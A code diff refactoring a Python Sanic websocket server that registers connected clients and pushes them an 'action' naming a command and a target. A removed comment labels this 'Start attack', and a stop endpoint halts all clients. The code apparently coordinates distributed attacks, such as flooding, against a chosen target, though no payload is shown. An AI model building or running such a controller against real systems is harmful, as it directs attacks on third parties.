@@ -1,5 +1,4 @@
 import json
-import asyncio
 import logging
 
 from websockets.connection import State
@@ -10,7 +9,7 @@ from sanic.response import json as json_response
 
 from models import CommandStop
 from services.action_services import get_action, create_action, set_action, remove_action
-from services.ws_services import wait_for_action, add_client, remove_client, get_clients , purge_clients
+from services.ws_services import add_client, get_clients, dispatch_client
 
 
 bp = Blueprint("main")
@@ -30,21 +29,7 @@ async def main_websocket(request: Request, ws: WebsocketImplProtocol):
             }))
         logger.info(f"Client registered '{request.ip}'")
 
-        # Wait for action
-        await wait_for_action(ws)
-        action = await get_action()
-
-        # Start attack
-        await ws.send(json.dumps({
-            'action': action.dict()
-        }))
-        logger.info(f"Sending action '{action.command.title}' to '{request.ip}'")
-
-        while True:
-            if ws.connection.state == State.CLOSED:
-                break
-            await asyncio.sleep(0.1)
-        await remove_client(client)
+        await dispatch_client(client)
 
 
 @bp.post("/")
@@ -57,7 +42,7 @@ async def main_view(request: Request):
         })
 
     action, errors = await create_action(action)
-    if errors is not None:http://
+    if errors is not None:
         return json_response({
             'status': 'error',
             'errors': [{
@@ -83,12 +68,13 @@ async def stop_view(request: Request):
 
     await remove_action()
     for client in await get_clients():
-        await client.ws.send(json.dumps({
-            "command": CommandStop().dict(),
-            "target": action.target.dict()
-        }))
+        if client.ws.connection.state != State.CLOSED:
+            stop_action = action
+            stop_action.command = CommandStop()
+            await client.ws.send(json.dumps({
+                'action': action.dict()
+            }))
 
-    await purge_clients()
     return json_response({
         'status': 'success'
     })
